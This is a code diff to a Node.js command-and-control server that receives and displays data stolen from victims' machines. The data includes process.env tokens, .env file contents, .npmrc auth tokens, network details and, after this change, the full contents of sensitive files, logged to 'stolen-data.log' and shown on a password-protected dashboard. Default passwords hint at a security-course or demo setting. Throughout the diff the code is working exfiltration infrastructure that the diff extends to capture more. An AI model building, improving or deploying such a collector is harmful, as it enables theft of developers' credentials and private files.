@@ -3,10 +3,27 @@ const crypto = require('crypto');
 const fs = require('fs');
 const path = require('path');
 
-const PORT = process.env.PORT || process.env.C2_PORT || 4444;
-const C2_SECRET = process.env.C2_SECRET || '';
-const DASH_PASS = process.env.DASH_PASS || 'csec2026';
-const LOG = path.join(__dirname, 'stolen-data.log');
+// Load .env file (zero-dependency)
+const envPath = path.join(__dirname, '.env');
+try {
+  fs.readFileSync(envPath, 'utf-8').split('\n').forEach(line => {
+    line = line.trim();
+    if (!line || line.startsWith('#')) return;
+    const eq = line.indexOf('=');
+    if (eq === -1) return;
+    const key = line.slice(0, eq).trim();
+    const val = line.slice(eq + 1).trim();
+    if (!process.env[key]) process.env[key] = val;
+  });
+} catch {}
+
+const PORT          = process.env.PORT || process.env.C2_PORT || '4444';
+const C2_SECRET     = process.env.C2_SECRET || '';
+const DASH_PASS     = process.env.DASH_PASS || 'csec';
+const BIND_HOST     = process.env.BIND_HOST || '0.0.0.0';
+const LOG           = path.join(__dirname, process.env.LOG_FILE || 'stolen-data.log');
+const MAX_BODY      = parseInt(process.env.MAX_BODY_BYTES, 10) || 1048576;
+const POLL_INTERVAL = parseInt(process.env.POLL_INTERVAL_MS, 10) || 600;
 
 const R = '\x1b[31m', G = '\x1b[32m', Y = '\x1b[33m', C = '\x1b[36m', B = '\x1b[1m', D = '\x1b[2m', X = '\x1b[0m';
 
@@ -42,7 +59,7 @@ function isAuthed(req) {
 function readBody(req) {
   return new Promise(resolve => {
     let body = '';
-    req.on('data', c => { if (body.length < 1e6) body += c; });
+    req.on('data', c => { if (body.length < MAX_BODY) body += c; });
     req.on('end', () => resolve(body));
   });
 }
@@ -84,7 +101,10 @@ http.createServer(async (req, res) => {
       console.log(`  ${Y}[process.env]${X}`);
       pt.forEach(k => console.log(`    ${R}${k}${X} = ${G}${v.proc_tokens[k].substring(0, 30)}...${X}`));
     }
-    if (v.files.length) console.log(`  ${C}[FILES]${X} ${v.files.join(', ')}`);
+    if (v.files.length) {
+      console.log(`  ${C}[FILES]${X} ${v.files.length} sensitive file(s) captured`);
+      v.files.forEach(f => console.log(`    ${C}${f.path}${X} (${f.content.length} bytes)`));
+    }
     console.log('');
     res.writeHead(200).end('ok');
     return;
@@ -137,7 +157,7 @@ http.createServer(async (req, res) => {
   }
 
   res.writeHead(404).end();
-}).listen(PORT, '0.0.0.0');
+}).listen(PORT, BIND_HOST);
 
 function loginPage(err) {
   return `<!DOCTYPE html><html><head>
@@ -197,7 +217,10 @@ body{font-family:'JetBrains Mono','Fira Code',monospace;background:#080808;color
 @keyframes ti{from{opacity:0;transform:translateX(-12px)}to{opacity:1;transform:translateX(0)}}
 .tk .tn{color:#f85149;font-size:.78rem;font-weight:700}
 .tk .tv{color:#3fb950;font-size:.75rem;word-break:break-all;max-width:58%;text-align:right}
-.ft{display:inline-block;background:#f8514918;color:#f85149;padding:2px 8px;border-radius:3px;font-size:.72rem;margin:2px}
+.ft{margin-bottom:8px}
+.ft-name{color:#f85149;font-size:.78rem;font-weight:700;margin-bottom:4px;display:flex;align-items:center;gap:6px}
+.ft-name span{background:#f8514918;padding:2px 8px;border-radius:3px;font-size:.72rem}
+.ft-content{background:#0a0a0a;border:1px solid #222;border-left:3px solid #58a6ff;border-radius:5px;padding:10px 12px;font-size:.72rem;color:#8b949e;white-space:pre-wrap;word-break:break-all;max-height:200px;overflow-y:auto}
 .nr{font-size:.75rem;color:#888;word-break:break-all}
 .nt{font-size:.78rem;color:#666;padding:2px 0}
 </style></head><body>
@@ -227,7 +250,7 @@ setInterval(async()=>{
   if(vs.length<=seen)return;
   for(let i=seen;i<vs.length;i++) render(vs[i]);
   seen=vs.length;
-},600);
+},${POLL_INTERVAL});
 function render(v){
   playAlert();
   document.querySelector('.empty')?.remove();
@@ -250,7 +273,13 @@ function render(v){
   let ptH='';
   Object.entries(v.proc_tokens||{}).forEach(([k,val])=>{ptH+='<div class="tk"><span class="tn">'+esc(k)+'</span><span class="tv">'+esc(val)+'</span></div>';});
 
-  let fh='';(v.files||[]).forEach(f=>{fh+='<span class="ft">~/'+esc(f)+'</span>';});
+  let fh='';(v.files||[]).forEach(f=>{
+    if(typeof f==='object'&&f.path){
+      fh+='<div class="ft"><div class="ft-name"><span>~/'+esc(f.path)+'</span></div><pre class="ft-content">'+esc(f.content)+'</pre></div>';
+    } else {
+      fh+='<div class="ft"><div class="ft-name"><span>~/'+esc(f)+'</span></div></div>';
+    }
+  });
   let nh='';(v.network||[]).forEach(n=>{nh+='<div class="nt">'+esc(n.iface)+': '+esc(n.ip)+' ('+esc(n.mac)+')</div>';});
   let nrh=v.npmrc?'<div class="sec"><h3>NPMRC Auth</h3><div class="nr">'+esc(v.npmrc)+'</div></div>':'';
 
@@ -264,7 +293,7 @@ function render(v){
   (envH?'<div class="sec"><h3>&#x1f4c1; Stolen from .env Files</h3>'+envH+'</div>':'')+
   (ptH?'<div class="sec"><h3>&#x1f6a8; Stolen from process.env</h3>'+ptH+'</div>':'')+
   nrh+
-  (fh?'<div class="sec"><h3>Sensitive Files Found</h3>'+fh+'</div>':'')+
+  (fh?'<div class="sec"><h3>Sensitive Files Captured</h3>'+fh+'</div>':'')+
   (nh?'<div class="sec"><h3>Network</h3>'+nh+'</div>':'');
   document.getElementById('feed').prepend(c);
 }
